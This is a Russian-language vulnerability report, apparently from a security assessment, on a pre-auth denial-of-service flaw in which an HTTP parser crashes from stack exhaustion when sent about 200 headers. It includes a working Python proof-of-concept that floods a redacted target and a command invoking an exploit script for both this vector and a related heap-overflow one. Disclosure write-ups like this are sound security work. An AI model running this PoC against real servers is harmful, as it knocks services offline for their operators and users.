# [HF] HTTP Header Flood — Parser Stack Exhaustion

**CWE-400** · **CVSS 7.5 High** · **Pre-auth** · **Remote**

---

## Краткое описание

HTTP-парсер не ограничивает количество обрабатываемых заголовков. При отправке ~200 произвольных заголовков по 64 байта каждый происходит исчерпание стека парсера или структурная перегрузка обработчика.

---

## Технические детали

### Механизм

```http
GET / HTTP/1.1
Host: █████████████
X-Flood-000: AAAA...AA (50 байт)
X-Flood-001: AAAA...AA (50 байт)
...
X-Flood-199: AAAA...AA (50 байт)
Connection: close
```

Каждый заголовок обрабатывается парсером рекурсивно или через цикл с выделением стековой памяти. При ~200 заголовках стек истощается.

### Характеристики

| Параметр | Значение |
|---------|---------|
| Количество заголовков | ~200 |
| Размер каждого | ~64 байта |
| Общий размер запроса | ~13 KB |
| Тип краша | Stack exhaustion |
| Recovery | ~5–15 сек |

---

## Доказательство (PoC)

```python
import socket

TARGET = "█████████████"
hdrs = b''
for i in range(200):
    hdrs += f'X-Flood-{i:03d}: '.encode() + b'B' * 50 + b'\r\n'

req = (b"GET / HTTP/1.1\r\n"
       b"Host: " + TARGET.encode() + b"\r\n"
       + hdrs +
       b"Connection: close\r\n\r\n")

s = socket.socket(); s.settimeout(8)
s.connect((TARGET, 80)); s.sendall(req)
# → нет ответа → стек парсера исчерпан
```

---

## Отличие от [HH]

| Параметр | [HF] Header Flood | [HH] Host Overflow |
|---------|-------------------|--------------------|
| Механизм | Stack exhaustion | Heap corruption |
| Вектор | Количество заголовков | Длина одного заголовка |
| Стабильность | ~100% | ~65% |
| CVE | Нет | Нет |

---

## CVSS v3.1

```
AV:N / AC:L / PR:N / UI:N / S:U / C:N / I:N / A:H  =  7.5 High
```

---

## Эксплойт

```bash
python3 exploits/crashbandicoot.py -t █████████████ --mode dos-http
# (включает оба вектора HH + HF)
```
